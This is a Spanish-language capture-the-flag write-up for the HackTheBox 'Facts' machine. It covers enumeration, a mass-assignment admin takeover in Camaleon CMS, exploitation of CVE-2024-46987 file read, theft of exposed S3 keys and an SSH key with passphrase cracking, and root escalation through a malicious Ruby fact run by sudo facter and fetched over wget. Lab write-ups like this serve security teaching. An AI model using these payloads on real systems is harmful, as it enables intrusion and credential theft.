# Facts — Write-Up

| Campo | Detalle |
|---|---|
| **Máquina** | [Facts](https://app.hackthebox.com/machines/Facts) |
| **Plataforma** | [HackTheBox](https://app.hackthebox.com/) |
| **Sistema Operativo** | Linux (Ubuntu) |
| **Dificultad** | Fácil |
| **Flags** | 2 (user + root) |

---

## Reconocimiento

### Enumeración de puertos

Se lanza un escaneo completo con Nmap para descubrir servicios activos:

```bash
nmap -p- -sCV -T5 --open -vvv -oN Facts 10.129.14.49
```

![Nmap Scan](images/01_nmap_scan.jpg)

Puertos abiertos:
- **Puerto 22** — SSH (OpenSSH 9.9p1, Ubuntu)
- **Puerto 80** — HTTP (nginx 1.26.3, Ubuntu)
- **Puerto 54321** — HTTP (Golang net/http — MinIO)

El escaneo también revela en los fingerprints del puerto 54321 referencias a `Trinity.txt.bak` y un endpoint S3, lo que indica que hay un servidor MinIO expuesto.

### Configuración del fichero hosts

Se añade el dominio `facts.htb` al fichero `/etc/hosts` para resolver correctamente el virtual host:

```bash
echo "10.129.14.49 facts.htb" >> /etc/hosts
```

![Hosts](images/02_hosts.jpg)

---

## Enumeración Web

Al acceder a `facts.htb` desde el navegador se muestra una aplicación de trivia llamada **FACTS** con un botón "Start Exploring":

![Web Home](images/03_web_home.jpg)

### Fuzzing de directorios

Se lanza **ffuf** sobre `facts.htb` para descubrir rutas adicionales:

```bash
ffuf -u http://facts.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Ffuf](images/04_ffuf.jpg)

Se descubren rutas relevantes como `/admin`, `/search`, `/sitemap`, `/robots`, entre otras.

### Panel de administración

Se accede a `facts.htb/admin/login` y se muestra un formulario de login del CMS:

![Admin Login](images/05_admin_login.jpg)

Se descubre también el endpoint de registro en `facts.htb/admin/register`. Se crea una cuenta con usuario **JJ** y contraseña **pepe**:

![Register](images/06_register.jpg)

Tras el registro se accede al dashboard del CMS. En el pie de página se identifica el software: **Camaleon CMS versión 2.9.0**:

![Dashboard](images/07_dashboard.jpg)

---

## Explotación — CVE-2024-46987 (Camaleon CMS Arbitrary File Read)

### Investigación de la vulnerabilidad

Se busca información sobre la versión del CMS. Se encuentra **CVE-2024-46987**: una vulnerabilidad de Path Traversal / LFI en el método `download_private_file` del `MediaController` de Camaleon CMS 2.8.0 a 2.9.0, que permite a usuarios autenticados leer ficheros arbitrarios del servidor:

![CVE](images/08_cve.jpg)

### Clonado del exploit

Se clona el repositorio con el PoC en Python:

```bash
git clone https://github.com/Goultarde/CVE-2024-46987
```

![Git Clone](images/10_git_clone.jpg)

### Escalada de privilegios en el CMS — Mass Assignment

Antes de ejecutar el exploit se necesitan credenciales de administrador. Se intercepta con **Burp Suite** la petición de actualización de perfil:

![Burp Normal](images/11_burp_normal.jpg)

Se añade el parámetro `&password[role]=admin` al body de la petición para aprovechar una vulnerabilidad de mass assignment y asignarse el rol de administrador:

![Burp Role Admin](images/12_burp_role_admin.jpg)

Se refresca el panel y se confirma acceso completo como administrador, con todos los menús habilitados (Users, Settings, Plugins, etc.):

![Admin Panel](images/13_admin_panel.jpg)

### Lectura de ficheros con el exploit

Con credenciales de administrador se ejecuta el exploit para leer `/etc/passwd` y descubrir usuarios del sistema:

```bash
python3 CVE-2024-46987.py -u 'http://facts.htb' -l 'JJ' -p 'pepe' '/etc/passwd'
```

![LFI Passwd](images/09_lfi_passwd.jpg)

Se identifican dos usuarios con shell válida: **trivia** y **william**.

### Credenciales AWS S3 expuestas en el panel

En **Settings → General Site → Filesystem Settings** se encuentran las credenciales de AWS S3 configuradas en la aplicación:

- **Access Key:** `AKIA8A2C6AC6FBE2D7F4`
- **Secret Key:** `5QCdcJ9aZkIfshCtfj5urkd5pRIRQwFzBQu9a2kt`
- **Bucket:** `internal`
- **Endpoint:** `http://localhost:54321`

![S3 Credentials](images/14_s3_credentials.jpg)

---

## Acceso Inicial — Clave SSH desde bucket S3

### Configuración del cliente AWS

Se configuran las credenciales encontradas en el cliente AWS:

```bash
aws configure
```

![AWS Configure](images/15_aws_configure.jpg)

### Descarga del bucket interno

Se descarga el contenido del bucket `s3://internal` apuntando al endpoint MinIO expuesto en el puerto 54321:

```bash
aws s3 cp --recursive --endpoint-url http://facts.htb:54321 s3://internal ./s3bucket
```

![S3 Download](images/16_s3_download.jpg)

### Exploración del bucket

Se lista el contenido del directorio descargado. Se encuentra una carpeta `.ssh`:

```bash
ls -a
```

![S3 Contents](images/17_s3_contents.jpg)

### Robo de clave privada y crackeo

Se lee la clave privada SSH encontrada en el bucket:

```bash
cat id_ed25519
```

Se extrae el hash con **ssh2john** y se crackea con **John the Ripper**:

```bash
ssh2john id_ed25519 > hash
john hash --wordlist=/home/kali/Escritorio/rockyou.txt
```

La passphrase obtenida es: **dragonballz**

![SSH Key Crack](images/18_ssh_key_crack.jpg)

### Conexión SSH

Se establece la conexión SSH con el usuario **trivia** usando la clave privada y la passphrase encontrada:

```bash
chmod 600 .ssh/id_ed25519
ssh trivia@facts.htb -i .ssh/id_ed25519
```

![SSH Login](images/19_ssh_login.jpg)

### Flag de usuario

```bash
cd /home/william
ls
cat user.txt
```

![User Flag](images/20_user_flag.jpg)

---

## Escalada de Privilegios — sudo facter

### Enumeración de permisos sudo

Se comprueba qué puede ejecutar `trivia` con privilegios elevados:

```bash
sudo -l
```

![Sudo -l](images/21_sudo_l.jpg)

```
(ALL) NOPASSWD: /usr/bin/facter
```

El usuario puede ejecutar **facter** como root sin contraseña. Facter es una herramienta de inventario del sistema que acepta el parámetro `--custom-dir` para cargar ficheros `.rb` personalizados. Esto permite ejecutar código Ruby arbitrario como root.

### Creación del exploit Ruby

Se crea un fichero `exploit.rb` en `/tmp` con un payload que lanza una shell con privilegios de root:

```ruby
Facter.add(:escalada) do
  setcode do
    system("/bin/bash -p")
  end
end
```

![Exploit RB](images/22_exploit_rb.jpg)

### Transferencia del exploit a la máquina víctima

Se levanta un servidor HTTP en la máquina atacante y se descarga el fichero desde la víctima:

```bash
# Atacante
python3 -m http.server 65

# Víctima
cd /tmp
wget http://10.10.14.137:65/exploit.rb
```

![Wget Exploit](images/23_wget_exploit.jpg)

### Ejecución y escalada

Se ejecuta facter con el directorio personalizado apuntando a `/tmp`:

```bash
sudo /usr/bin/facter --custom-dir /tmp
whoami
# root
```

![Root Shell](images/24_root_shell.jpg)

### Flag de root

```bash
cd /root
ls
cat root.txt
```

![Root Flag](images/25_root_flag.jpg)

---

## Resumen

| Fase | Técnica | Herramienta |
|---|---|---|
| Enumeración | Port Scan | `nmap` |
| Enumeración web | Fuzzing de directorios | `ffuf` |
| Acceso al CMS | Registro de cuenta | Navegador |
| Escalada en CMS | Mass Assignment (`password[role]=admin`) | Burp Suite |
| Explotación | LFI / Path Traversal (CVE-2024-46987) | Python PoC |
| Obtención de credenciales | AWS S3 credentials expuestas en Settings | Navegador |
| Acceso inicial | Clave SSH robada del bucket S3 + crackeo de passphrase | `aws` / `ssh2john` / `john` |
| Escalada | `sudo facter --custom-dir` con fichero `.rb` malicioso | `facter` / Ruby |
